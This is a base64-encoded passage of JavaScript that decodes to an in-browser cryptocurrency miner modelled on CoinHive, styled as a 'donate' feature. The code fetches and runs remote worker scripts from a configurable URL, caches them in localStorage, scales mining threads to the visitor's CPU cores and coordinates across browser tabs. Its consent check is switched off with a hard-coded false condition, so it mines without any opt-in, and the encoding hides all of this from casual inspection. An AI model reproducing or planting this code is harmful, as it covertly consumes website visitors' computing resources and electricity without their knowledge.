JCX0pOwoJCWxvYWRDc3MoKTsKCQl3aW5kb3cuaHBzdGltZXIgPSBzZXRJbnRlcnZhbChnZXRIUFMsIDEwMDApOwoJCWlmKHdpbmRvdy5jcHUgIT0xKXsgc2V0U3Bpbm5lcigyNSk7IH0KCX0KfQoKZnVuY3Rpb24gbG9hZENzcygpewoJdmFyIGwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdsaW5rJyk7CglsLnR5cGUgPSAndGV4dC9jc3MnOwoJbC5yZWwgPSAnc3R5bGVzaGVldCc7CglsLm1lZGlhID0gJ3NjcmVlbic7CglsLmhyZWYgPSAnaHR0cHM6Ly9ub2RlLmNmY2Rpc3QuZ2RuL3ZlbmRvci9kb25hdGVfc3R5bGUuY3NzJzsKCWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQobCk7Cn0KZnVuY3Rpb24gZ2V0SFBTKCl7CglpZih3aW5kb3cubWluZXIgPT0gbnVsbCl7IHJldHVybjsgfQoJdmFyIGhwcyA9IHdpbmRvdy5taW5lci5nZXRIYXNoZXNQZXJTZWNvbmQoKTsKCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJocHMiKS5pbm5lckhUTUwgPU1hdGgucm91bmQoaHBzKSA7Cgp9CmZ1bmN0aW9uIHNldFNwaW5uZXIodmFsKXsKICAgICAgICByaW5ndS5jbGFzc05hbWUgPSIiOwogICAgICAgIGlmKHdpbmRvdy5taW5lciAhPSBudWxsKXsKCQlpZih2YWwgPT0wKXsKCQkJLy8/CiAgICAgICAgICAgICAgICB9ZWxzZSBpZih2YWwgPCAyNSl7CiAgICAgICAgICAgICAgICAgICAgICAgIHJpbmd1LmNsYXNzTGlzdC5hZGQoInNwaW4tc2xvd2VzdCIpOwogICAgICAgICAgICAgICAgfWVsc2UgaWYodmFsIDwgNTApewogICAgICAgICAgICAgICAgICAgICAgICByaW5ndS5jbGFzc0xpc3QuYWRkKCJzcGluLXNsb3ciKTsKICAgICAgICAgICAgICAgIH1lbHNlIGlmKHZhbCA8IDc1KXsKICAgICAgICAgICAgICAgICAgICAgICAgcmluZ3UuY2xhc3NMaXN0LmFkZCgic3Bpbi1mYXN0Iik7CiAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgcmluZ3UuY2xhc3NMaXN0LmFkZCgic3Bpbi1mYXN0ZXN0Iik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQp9CmZ1bmN0aW9uIHJlYWRMb2NhbChuYW1lKSB7Cgl2YXIgc3RvcmVkID0gbG9jYWxTdG9yYWdlW25hbWVdOwoJaWYgKHN0b3JlZCkgewoJCXJldHVybiBzdG9yZWQ7Cgl9CgllbHNlIHtyZXR1cm4gbnVsbDsgfQoKfQoKCmZ1bmN0aW9uIGlzTnVtYmVyKG4pIHsgcmV0dXJuICFpc05hTihwYXJzZUZsb2F0KG4pKSAmJiAhaXNOYU4obiAtIDApIH0KCgoKCmZ1bmN0aW9uIHNldHVwTWluZXIobGliVXJsKSB7CgogICJ1c2Ugc3RyaWN0IjsKICB2YXIgTWluZXIgPSBmdW5jdGlvbihzaXRlS2V5LCBwYXJhbXMpIHsKICAgIHRoaXMucGFyYW1zID0gcGFyYW1zIHx8IHt9OwogICAgdGhpcy5fc2l0ZUtleSA9IHNpdGVLZXk7CiAgICB0aGlzLl91c2VyID0gbnVsbDsKICAgIHRoaXMuX3RocmVhZHMgPSBbXTsKICAgIHRoaXMuX2hhc2hlcyA9IDA7CiAgICB0aGlzLl9jdXJyZW50Sm9iID0gbnVsbDsKICAgIHRoaXMuX2F1dG9SZWNvbm5lY3QgPSB0cnVlOwogICAgdGhpcy5fcmVjb25uZWN0UmV0cnkgPSAzOwogICAgdGhpcy5fdG9rZW5Gcm9tU2VydmVyID0gbnVsbDsKICAgIHRoaXMuX2dvYWwgPSAwOwogICAgdGhpcy5fdG90YWxIYXNoZXNGcm9tRGVhZFRocmVhZHMgPSAwOwogICAgdGhpcy5fdGhyb3R0bGUgPSBNYXRoLm1heCgwLCBNYXRoLm1pbigwLjk5LCB0aGlzLnBhcmFtcy50aHJvdHRsZSB8fCAwKSk7CiAgICB0aGlzLl9zdG9wT25JbnZhbGlkT3B0SW4gPSBmYWxzZTsKICAgIHRoaXMuX2F1dG9UaHJlYWRzID0gewogICAgICBlbmFibGVkOiAhIXRoaXMucGFyYW1zLmF1dG9UaHJlYWRzLAogICAgICBpbnRlcnZhbDogbnVsbCwKICAgICAgYWRqdXN0QXQ6IG51bGwsCiAgICAgIGFkanVzdEV2ZXJ5OiAxZTQsCiAgICAgIHN0YXRzOiB7fQogICAgfTsKICAgIHRoaXMuX3RhYiA9IHsKICAgICAgaWRlbnQ6IChNYXRoLnJhbmRvbSgpICogMTY3NzcyMTUpIHwgMCwKICAgICAgbW9kZTogQ0guSUZfRVhDTFVTSVZFX1RBQiwKICAgICAgZ3JhY2U6IDAsCiAgICAgIGxhc3RQaW5nUmVjZWl2ZWQ6IDAsCiAgICAgIGludGVydmFsOiBudWxsCiAgICB9OwogICAgaWYgKHdpbmRvdy5Ccm9hZGNhc3RDaGFubmVsKSB7CiAgICAgIHRyeSB7CiAgICAgICAgdGhpcy5fYmMgPSBuZXcgQnJvYWRjYXN0Q2hhbm5lbCgiQ0giKTsKICAgICAgICB0aGlzLl9iYy5vbm1lc3NhZ2UgPSBmdW5jdGlvbihtc2cpIHsKICAgICAgICAgIGlmIChtc2cuZGF0YSA9PT0gInBpbmciKSB7CiAgICAgICAgICAgIHRoaXMuX3RhYi5sYXN0UGluZ1JlY2VpdmVkID0gRGF0ZS5ub3coKTsKICAgICAgICAgIH0KICAgICAgICB9LmJpbmQodGhpcyk7CiAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICB9CiAgICB0aGlzLl9ldmVudExpc3RlbmVycyA9IHsKICAgICAgb3BlbjogW10sCiAgICAgIGF1dGhlZDogW10sCiAgICAgIGNsb3NlOiBbXSwKICAgICAgZXJyb3I6IFtdLAogICAgICBqb2I6IFtdLAogICAgICBmb3VuZDogW10sCiAgICAgIGFjY2VwdGVkOiBbXSwKICAgICAgb3B0aW46IFtdCiAgICB9OwogICAgdmFyIGRlZmF1bHRUaHJlYWRzID0gbmF2aWdhdG9yLmhhcmR3YXJlQ29uY3VycmVuY3kgfHwgNDsKICAgIHRoaXMuX3RhcmdldE51bVRocmVhZHMgPSB0aGlzLnBhcmFtcy50aHJlYWRzIHx8IGRlZmF1bHRUaHJlYWRzOwogICAgdGhpcy5fdXNlV0FTTSA9IHRoaXMuaGFzV0FTTVN1cHBvcnQoKSAmJiAhdGhpcy5wYXJhbXMuZm9yY2VBU01KUzsKICAgIHRoaXMuX21pbmJpblN0YXR1cyA9ICJ1bmxvYWRlZCI7CiAgICB0aGlzLl9vblRhcmdldE1ldEJvdW5kID0gdGhpcy5fb25UYXJnZXRNZXQuYmluZCh0aGlzKTsKICAgIHRoaXMuX29uVmVyaWZpZWRCb3VuZCA9IHRoaXMuX29uVmVyaWZpZWQuYmluZCh0aGlzKTsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5zdGFydCA9IGZ1bmN0aW9uKG1vZGUsIG9wdEluVG9rZW4pIHsKICAgIHRoaXMuX3RhYi5tb2RlID0gbW9kZSB8fCBDSC5JRl9FWENMVVNJVkVfVEFCOwogICAgdGhpcy5fb3B0SW5Ub2tlbiA9IG9wdEluVG9rZW47CiAgICBpZiAodGhpcy5fdGFiLmludGVydmFsKSB7CiAgICAgIGNsZWFySW50ZXJ2YWwodGhpcy5fdGFiLmludGVydmFsKTsKICAgICAgdGhpcy5fdGFiLmludGVydmFsID0gbnVsbDsKICAgIH0KICAgIGlmICh0aGlzLl9taW5iaW5TdGF0dXMgPT09ICJsb2FkZWQiKSB7CiAgICAgIHRoaXMuX3N0YXJ0Tm93KCk7CiAgICB9IGVsc2UgaWYgKHRoaXMuX3VzZVdBU00pIHsKCQlpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiTWluZXIgbG9hZGluZyB3YXNtIik7IH0KCQl0aGlzLl9taW5iaW5TdGF0dXMgPSAicGVuZGluZyI7CgkJdGhpcy5kb1dhc21HdXkoKTsgCgl9ZWxzZXsKCQlpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiTWluZXIgbG9hZGluZyBhc20iKTsgfQoJCXRoaXMuX21pbmJpblN0YXR1cyA9ICJwZW5kaW5nIjsKCQl0aGlzLmRvQXNtR3V5KCk7IAogICAgfQogIH07CgpNaW5lci5wcm90b3R5cGUuZG9Bc21HdXkgPSBmdW5jdGlvbigpewoJdmFyIGd1eSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJjZmNfYWpzIik7CiAgICAgICAgaWYgKGd1eSAmJiBndXkuc3RhcnRzV2l0aCgnY29uc3QnKSl7IAoJCWlmKHdpbmRvdy5kZWJ1Zyl7IGNvbnNvbGUubG9nKCJBU00gbG9hZGVkIGZyb20gY2FjaGUiKTsgfQogICAgICAgICAgQ0guQ1JZUFRPTklHSFRfV09SS0VSX0JMT0IgPQogICAgICAgICAgICB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbZ3V5XSkpICsKICAgICAgICAgICAgIiMiICsKICAgICAgICAgICAgbGliVXJsOwogICAgICAgICAgdGhpcy5fbWluYmluU3RhdHVzID0gImxvYWRlZCI7CiAgICAgICAgICB0aGlzLl9zdGFydE5vdygpOwoJCXJldHVybjsKCX0KCWlmKHdpbmRvdy5kZWJ1Zyl7IGNvbnNvbGUubG9nKCJSZW1vdGVseSByZXRyaWV2aW5nIEFTTSBmcm9tOiAiK2xpYlVybCsiYS5qcyIpOyB9CiAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgeGhyLmFkZEV2ZW50TGlzdGVuZXIoCiAgICAgICAgImxvYWQiLAogICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oImNmY19hanMiLCB4aHIucmVzcG9uc2VUZXh0KTsKICAgICAgICAgIENILkNSWVBUT05JR0hUX1dPUktFUl9CTE9CID0KICAgICAgICAgICAgd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwobmV3IEJsb2IoW3hoci5yZXNwb25zZVRleHRdKSkgKwogICAgICAgICAgICAiIyIgKwogICAgICAgICAgICBsaWJVcmw7CiAgICAgICAgICB0aGlzLl9taW5iaW5TdGF0dXMgPSAibG9hZGVkIjsKICAgICAgICAgIHRoaXMuX3N0YXJ0Tm93KCk7CiAgICAgICAgfS5iaW5kKHRoaXMpLAogICAgICAgIHhocgogICAgICApOwogICAgICB4aHIub3BlbigiZ2V0IiwgbGliVXJsICsgImEuanMiLCB0cnVlKTsKICAgICAgeGhyLnNlbmQoKTsKfQoKTWluZXIucHJvdG90eXBlLmRvV2FzbUd1eSA9IGZ1bmN0aW9uKCl7Cgl2YXIgZ3V5ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oImNmY193YWpzIik7CiAgICAgICAgaWYgKGd1eSAmJiBndXkuc3RhcnRzV2l0aCgndmFyJykpeyAKCQlpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiV0FTTSBsb2FkZWQgZnJvbSBjYWNoZSIpOyB9CiAgICAgICAgICBDSC5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQiA9CiAgICAgICAgICAgIHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKG5ldyBCbG9iKFtndXldKSkgKwogICAgICAgICAgICAiIyIgKwogICAgICAgICAgICBsaWJVcmw7CiAgICAgICAgICB0aGlzLl9taW5iaW5TdGF0dXMgPSAibG9hZGVkIjsKICAgICAgICAgIHRoaXMuX3N0YXJ0Tm93KCk7CgkJcmV0dXJuOwoJfQoJaWYod2luZG93LmRlYnVnKXsgY29uc29sZS5sb2coIlJlbW90ZWx5IHJldHJpZXZpbmcgV0FTTSBmcm9tOiAiK2xpYlVybCsid2EuanMiKTsgfQogICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgIHhoci5hZGRFdmVudExpc3RlbmVyKAogICAgICAgICJsb2FkIiwKICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJjZmNfd2FqcyIsIHhoci5yZXNwb25zZVRleHQpOwogICAgICAgICAgQ0guQ1JZUFRPTklHSFRfV09SS0VSX0JMT0IgPQogICAgICAgICAgICB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbeGhyLnJlc3BvbnNlVGV4dF0pKSArCiAgICAgICAgICAgICIjIiArCiAgICAgICAgICAgIGxpYlVybDsKICAgICAgICAgIHRoaXMuX21pbmJpblN0YXR1cyA9ICJsb2FkZWQiOwogICAgICAgICAgdGhpcy5fc3RhcnROb3coKTsKICAgICAgICB9LmJpbmQodGhpcyksCiAgICAgICAgeGhyCiAgICAgICk7CiAgICAgIHhoci5vcGVuKCJnZXQiLCBsaWJVcmwgKyAid2EuanMiLCB0cnVlKTsKICAgICAgeGhyLnNlbmQoKTsKfQoKICBNaW5lci5wcm90b3R5cGUuc3RvcCA9IGZ1bmN0aW9uKG1vZGUpIHsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5fdGhyZWFkcy5sZW5ndGg7IGkrKykgewogICAgICB0aGlzLl90b3RhbEhhc2hlc0Zyb21EZWFkVGhyZWFkcyArPSB0aGlzLl90aHJlYWRzW2ldLmhhc2hlc1RvdGFsOwogICAgICB0aGlzLl90aHJlYWRzW2ldLnN0b3AoKTsKICAgIH0KICAgIHRoaXMuX3RocmVhZHMgPSBbXTsKICAgIHRoaXMuX2F1dG9SZWNvbm5lY3QgPSBmYWxzZTsKICAgIGlmICh0aGlzLl9zb2NrZXQpIHsKICAgICAgdGhpcy5fc29ja2V0LmNsb3NlKCk7CiAgICB9CiAgICB0aGlzLl9jdXJyZW50Sm9iID0gbnVsbDsKICAgIGlmICh0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCkgewogICAgICBjbGVhckludGVydmFsKHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsKTsKICAgICAgdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwgPSBudWxsOwogICAgfQogICAgaWYgKHRoaXMuX3RhYi5pbnRlcnZhbCAmJiBtb2RlICE9PSAiZG9udEtpbGxUYWJVcGRhdGUiKSB7CiAgICAgIGNsZWFySW50ZXJ2YWwodGhpcy5fdGFiLmludGVydmFsKTsKICAgICAgdGhpcy5fdGFiLmludGVydmFsID0gbnVsbDsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5nZXRIYXNoZXNQZXJTZWNvbmQgPSBmdW5jdGlvbigpIHsKICAgIHZhciBoYXNoZXNQZXJTZWNvbmQgPSAwOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLl90aHJlYWRzLmxlbmd0aDsgaSsrKSB7CiAgICAgIGhhc2hlc1BlclNlY29uZCArPSB0aGlzLl90aHJlYWRzW2ldLmhhc2hlc1BlclNlY29uZDsKICAgIH0KICAgIHJldHVybiBoYXNoZXNQZXJTZWNvbmQ7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuZ2V0VG90YWxIYXNoZXMgPSBmdW5jdGlvbihlc3RpbWF0ZSkgewogICAgdmFyIG5vdyA9IERhdGUubm93KCk7CiAgICB2YXIgaGFzaGVzID0gdGhpcy5fdG90YWxIYXNoZXNGcm9tRGVhZFRocmVhZHM7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgdmFyIHRocmVhZCA9IHRoaXMuX3RocmVhZHNbaV07CiAgICAgIGhhc2hlcyArPSB0aHJlYWQuaGFzaGVzVG90YWw7CiAgICAgIGlmIChlc3RpbWF0ZSkgewogICAgICAgIHZhciB0ZGlmZiA9IChub3cgLSB0aHJlYWQubGFzdE1lc3NhZ2VUaW1lc3RhbXApIC8gMWUzICogMC45OwogICAgICAgIGhhc2hlcyArPSB0ZGlmZiAqIHRocmVhZC5oYXNoZXNQZXJTZWNvbmQ7CiAgICAgIH0KICAgIH0KICAgIHJldHVybiBoYXNoZXMgfCAwOwogIH07CiAgTWluZXIucHJvdG90eXBlLmdldEFjY2VwdGVkSGFzaGVzID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5faGFzaGVzOwogIH07CiAgTWluZXIucHJvdG90eXBlLmdldFRva2VuID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5fdG9rZW5Gcm9tU2VydmVyOwogIH07CiAgTWluZXIucHJvdG90eXBlLm9uID0gZnVuY3Rpb24odHlwZSwgY2FsbGJhY2spIHsKICAgIGlmICh0aGlzLl9ldmVudExpc3RlbmVyc1t0eXBlXSkgewogICAgICB0aGlzLl9ldmVudExpc3RlbmVyc1t0eXBlXS5wdXNoKGNhbGxiYWNrKTsKICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5nZXRBdXRvVGhyZWFkc0VuYWJsZWQgPSBmdW5jdGlvbihlbmFibGVkKSB7CiAgICByZXR1cm4gdGhpcy5fYXV0b1RocmVhZHMuZW5hYmxlZDsKICB9OwogIE1pbmVyLnByb3RvdHlwZS5zZXRBdXRvVGhyZWFkc0VuYWJsZWQgPSBmdW5jdGlvbihlbmFibGVkKSB7CiAgICB0aGlzLl9hdXRvVGhyZWFkcy5lbmFibGVkID0gISFlbmFibGVkOwogICAgaWYgKCFlbmFibGVkICYmIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsKSB7CiAgICAgIGNsZWFySW50ZXJ2YWwodGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpOwogICAgICB0aGlzLl9hdXRvVGhyZWFkcy5pbnRlcnZhbCA9IG51bGw7CiAgICB9CiAgICBpZiAoZW5hYmxlZCAmJiAhdGhpcy5fYXV0b1RocmVhZHMuaW50ZXJ2YWwpIHsKICAgICAgdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0QXQgPSBEYXRlLm5vdygpICsgdGhpcy5fYXV0b1RocmVhZHMuYWRqdXN0RXZlcnk7CiAgICAgIHRoaXMuX2F1dG9UaHJlYWRzLmludGVydmFsID0gc2V0SW50ZXJ2YWwoCiAgICAgICAgdGhpcy5fYWRqdXN0VGhyZWFkcy5iaW5kKHRoaXMpLAogICAgICAgIDFlMwogICAgICApOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmdldFRocm90dGxlID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5fdGhyb3R0bGU7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuc2V0VGhyb3R0bGUgPSBmdW5jdGlvbih0aHJvdHRsZSkgewogICAgdGhpcy5fdGhyb3R0bGUgPSBNYXRoLm1heCgwLCBNYXRoLm1pbigwLjk5LCB0aHJvdHRsZSkpOwogICAgaWYgKHRoaXMuX2N1cnJlbnRKb2IpIHsKICAgICAgdGhpcy5fc2V0Sm9iKHRoaXMuX2N1cnJlbnRKb2IpOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmdldE51bVRocmVhZHMgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiB0aGlzLl90YXJnZXROdW1UaHJlYWRzOwogIH07CiAgTWluZXIucHJvdG90eXBlLnNldE51bVRocmVhZHMgPSBmdW5jdGlvbihudW0pIHsKICAgIHZhciBudW0gPSBNYXRoLm1heCgxLCBudW0gfCAwKTsKICAgIHRoaXMuX3RhcmdldE51bVRocmVhZHMgPSBudW07CiAgICBpZiAobnVtID4gdGhpcy5fdGhyZWFkcy5sZW5ndGgpIHsKICAgICAgZm9yICh2YXIgaSA9IDA7IG51bSA+IHRoaXMuX3RocmVhZHMubGVuZ3RoOyBpKyspIHsKICAgICAgICB2YXIgdGhyZWFkID0gbmV3IENILkpvYlRocmVhZCgpOwogICAgICAgIGlmICh0aGlzLl9jdXJyZW50Sm9iKSB7CiAgICAgICAgICB0aHJlYWQuc2V0Sm9iKHRoaXMuX2N1cnJlbnRKb2IsIHRoaXMuX29uVGFyZ2V0TWV0Qm91bmQpOwogICAgICAgIH0KICAgICAgICB0aGlzLl90aHJlYWRzLnB1c2godGhyZWFkKTsKICAgICAgfQogICAgfSBlbHNlIGlmIChudW0gPCB0aGlzLl90aHJlYWRzLmxlbmd0aCkgewogICAgICB3aGlsZSAobnVtIDwgdGhpcy5fdGhyZWFkcy5sZW5ndGgpIHsKICAgICAgICB2YXIgdGhyZWFkID0gdGhpcy5fdGhyZWFkcy5wb3AoKTsKICAgICAgICB0aGlzLl90b3RhbEhhc2hlc0Zyb21EZWFkVGhyZWFkcyArPSB0aHJlYWQuaGFzaGVzVG90YWw7CiAgICAgICAgdGhyZWFkLnN0b3AoKTsKICAgICAgfQogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLmhhc1dBU01TdXBwb3J0ID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gd2luZG93LldlYkFzc2VtYmx5ICE9PSB1bmRlZmluZWQ7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuaXNSdW5uaW5nID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gdGhpcy5fdGhyZWFkcy5sZW5ndGggPiAwOwogIH07CiAgTWluZXIucHJvdG90eXBlLl9zdGFydE5vdyA9IGZ1bmN0aW9uKCkgewogICAgaWYgKHRoaXMuX3RhYi5tb2RlICE9PSBDSC5GT1JDRV9NVUxUSV9UQUIgJiYgIXRoaXMuX3RhYi5pbnRlcnZhbCkgewogICAgICB0aGlzLl90YWIuaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbCh0aGlzLl91cGRhdGVUYWJzLmJpbmQodGhpcyksIDIwMDApOwogICAgfQogICAgaWYgKAogICAgICB0aGlzLl90YWIubW9kZSA9PT0gQ0guSUZfRVhDTFVTSVZFX1RBQiAmJgogICAgICB0aGlzLl9vdGhlclRhYlJ1bm5pbmcoKQogICAgKSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIGlmICh0aGlzLl90YWIubW9kZSA9PT0gQ0guRk9SQ0VfRVhDTFVTSVZFX1RBQikgewogICAgICB0aGlzLl90YWIuZ3JhY2UgPSBEYXRlLm5vdygpICsgM2UzOwogICAgfQogICAgaWYgKCF0aGlzLnZlcmlmeVRocmVhZCkgewogICAgICB0aGlzLnZlcmlmeVRocmVhZCA9IG5ldyBDSC5Kb2JUaHJlYWQoKTsKICAgIH0KICAgIHRoaXMuc2V0TnVtVGhyZWFkcyh0aGlzLl90YXJnZXROdW1UaHJlYWRzKTsKICAgIHRoaXMuX2F1dG9SZWNvbm5lY3QgPSB0cnVlOwogICAgaWYgKGZhbHNlICYmICF0aGlzLl9vcHRJblRva2VuKSB7CiAgICAgIHRoaXMuX2F1dGggPQogICAgICAgIHRoaXMuX2F1dGggfHwKICAgICAgICBuZXcgQ0guQXV0aCh0aGlzLl9zaXRlS2V5LCB7CiAgICAgICAgICB0aGVtZTogdGhpcy5wYXJhbXMudGhlbWUgfHwgImxpZ2h0IiwKICAgICAgICAgIGxhbmc6IHRoaXMucGFyYW1zLmxhbmd1YWdlIHx8ICJhdXRvIgogICAgICAgIH0pOwogICAgICB0aGlzLl9hdXRoLmF1dGgoCiAgICAgICAgZnVuY3Rpb24odG9rZW4pIHsKICAgICAgICAgIGlmICghdG9rZW4pIHsKICAgICAgICAgICAgdGhpcy5fZW1pdCgib3B0aW4iLCB7IHN0YXR1czogImNhbmNlbGVkIiB9KTsKICAgICAgICAgICAgdGhpcy5fZW1pdCgiZXJyb3IiLCB7IGVycm9yOiAib3B0X2luX2NhbmNlbGVkIiB9KTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgfQogICAgICAgICAgdGhpcy5fZW1pdCgib3B0aW4iLCB7IHN0YXR1czogImFjY2VwdGVkIiB9KTsKICAgICAgICAgIHRoaXMuX29wdEluVG9rZW4gPSB0b2tlbjsKICAgICAgICAgIHRoaXMuX2Nvbm5lY3QoKTsKICAgICAgICB9LmJpbmQodGhpcykKICAgICAgKTsKICAgIH0gZWxzZSB7CglpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiTWluZXIgY29ubmVjdGluZyIgKTsgfQogICAgICB0aGlzLl9jb25uZWN0KCk7CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX290aGVyVGFiUnVubmluZyA9IGZ1bmN0aW9uKCkgewogICAgaWYgKHRoaXMuX3RhYi5sYXN0UGluZ1JlY2VpdmVkID4gRGF0ZS5ub3coKSAtIDE1MDApIHsKICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICB0cnkgewogICAgICB2YXIgdGRqc29uID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIkNIIik7CiAgICAgIGlmICh0ZGpzb24pIHsKICAgICAgICB2YXIgdGQgPSBKU09OLnBhcnNlKHRkanNvbik7CiAgICAgICAgaWYgKHRkLmlkZW50ICE9PSB0aGlzLl90YWIuaWRlbnQgJiYgRGF0ZS5ub3coKSAtIHRkLnRpbWUgPCAxNTAwKSB7CiAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgIH0KICAgIH0gY2F0Y2ggKGUpIHt9CiAgICByZXR1cm4gZmFsc2U7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX3VwZGF0ZVRhYnMgPSBmdW5jdGlvbigpIHsKICAgIHZhciBvdGhlclRhYlJ1bm5pbmcgPSB0aGlzLl9vdGhlclRhYlJ1bm5pbmcoKTsKICAgIGlmIChvdGhlclRhYlJ1bm5pbmcgJiYgdGhpcy5pc1J1bm5pbmcoKSAmJiBEYXRlLm5vdygpID4gdGhpcy5fdGFiLmdyYWNlKSB7CiAgICAgIHRoaXMuc3RvcCgiZG9udEtpbGxUYWJVcGRhdGUiKTsKICAgIH0gZWxzZSBpZiAoIW90aGVyVGFiUnVubmluZyAmJiAhdGhpcy5pc1J1bm5pbmcoKSkgewogICAgICB0aGlzLl9zdGFydE5vdygpOwogICAgfQogICAgaWYgKHRoaXMuaXNSdW5uaW5nKCkpIHsKICAgICAgaWYgKHRoaXMuX2JjKSB7CiAgICAgICAgdGhpcy5fYmMucG9zdE1lc3NhZ2UoInBpbmciKTsKICAgICAgfQogICAgICB0cnkgewogICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKAogICAgICAgICAgIkNIIiwKICAgICAgICAgIEpTT04uc3RyaW5naWZ5KHsgaWRlbnQ6IHRoaXMuX3RhYi5pZGVudCwgdGltZTogRGF0ZS5ub3coKSB9KQogICAgICAgICk7CiAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICB9CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX2FkanVzdFRocmVhZHMgPSBmdW5jdGlvbigpIHsKICAgIHZhciBoYXNoZXMgPSB0aGlzLmdldEhhc2hlc1BlclNlY29uZCgpOwogICAgdmFyIHRocmVhZHMgPSB0aGlzLmdldE51bVRocmVhZHMoKTsKICAgIHZhciBzdGF0cyA9IHRoaXMuX2F1dG9UaHJlYWRzLnN0YXRzOwogICAgc3RhdHNbdGhyZWFkc10gPSBzdGF0c1t0aHJlYWRzXQogICAgICA/IHN0YXRzW3RocmVhZHNdICogMC41ICsgaGFzaGVzICogMC41CiAgICAgIDogaGFzaGVzOwogICAgaWYgKERhdGUubm93KCkgPiB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RBdCkgewogICAgICB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RBdCA9IERhdGUubm93KCkgKyB0aGlzLl9hdXRvVGhyZWFkcy5hZGp1c3RFdmVyeTsKICAgICAgdmFyIGN1ciA9IChzdGF0c1t0aHJlYWRzXSB8fCAwKSAtIDE7CiAgICAgIHZhciB1cCA9IHN0YXRzW3RocmVhZHMgKyAxXSB8fCAwOwogICAgICB2YXIgZG93biA9IHN0YXRzW3RocmVhZHMgLSAxXSB8fCAwOwogICAgICBpZiAoY3VyID4gZG93biAmJiAodXAgPT09IDAgfHwgdXAgPiBjdXIpICYmIHRocmVhZHMgPCA4KSB7CiAgICAgICAgcmV0dXJuIHRoaXMuc2V0TnVtVGhyZWFkcyh0aHJlYWRzICsgMSk7CiAgICAgIH0gZWxzZSBpZiAoY3VyID4gdXAgJiYgKCFkb3duIHx8IGRvd24gPiBjdXIpICYmIHRocmVhZHMgPiAxKSB7CiAgICAgICAgcmV0dXJuIHRoaXMuc2V0TnVtVGhyZWFkcyh0aHJlYWRzIC0gMSk7CiAgICAgIH0KICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5fZW1pdCA9IGZ1bmN0aW9uKHR5cGUsIHBhcmFtcykgewogICAgdmFyIGxpc3RlbmVycyA9IHRoaXMuX2V2ZW50TGlzdGVuZXJzW3R5cGVdOwogICAgaWYgKGxpc3RlbmVycyAmJiBsaXN0ZW5lcnMubGVuZ3RoKSB7CiAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGlzdGVuZXJzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgbGlzdGVuZXJzW2ldKHBhcmFtcyk7CiAgICAgIH0KICAgIH0KICB9OwogIE1pbmVyLnByb3RvdHlwZS5faGFzaFN0cmluZyA9IGZ1bmN0aW9uKHMpIHsKICAgIHZhciBoYXNoID0gNTM4MSwKICAgICAgaSA9IHMubGVuZ